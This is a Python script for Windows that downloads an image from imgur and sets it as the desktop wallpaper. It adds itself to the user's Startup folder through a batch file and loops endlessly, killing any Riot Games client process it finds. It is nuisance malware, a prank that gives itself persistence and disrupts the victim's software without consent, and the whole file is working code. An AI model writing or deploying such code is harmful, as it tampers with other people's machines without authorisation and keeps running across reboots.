def install_and_import(package):
    import importlib
    try:
        importlib.import_module(package)
    except ImportError:
        import pip
        pip.main(['install', package])
    finally:
        globals()[package] = importlib.import_module(package)

install_and_import('time')
time.sleep(1)
install_and_import('psutil')
install_and_import('ctypes')
install_and_import('getpass')
install_and_import('os')
install_and_import('pathlib')
install_and_import('urllib')
print("Success")



import urllib.request

USER_NAME = getpass.getuser()


urllib.request.urlretrieve("https://i.imgur.com/d4MNVxe.jpg", "slika.jpg")

bird = os.path.abspath("slika.jpg")

def add_to_startup(file_path):

    if file_path == r"":

        file_path = os.path.dirname(os.path.realpath(__file__))

    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME

    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)


def checkIfProcessRunning(processName):

    for proc in psutil.process_iter():
        try:

            if processName.lower() in proc.name().lower():

                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):

            pass
    return False;

def changewallpaper():

    ctypes.windll.user32.SystemParametersInfoW(20, 0, bird , 0)


    fileP = pathlib.Path(__file__).absolute()


    add_to_startup(fileP)

    print("Succesfully changed")


while True:


    if checkIfProcessRunning('RiotClientServices'):

        time.sleep(6)

        PROCNAME = "RiotClientServices.exe"

        for proc in psutil.process_iter():

            if proc.name() == PROCNAME:
                proc.kill()
                print("Successfully killed")

        changewallpaper()




















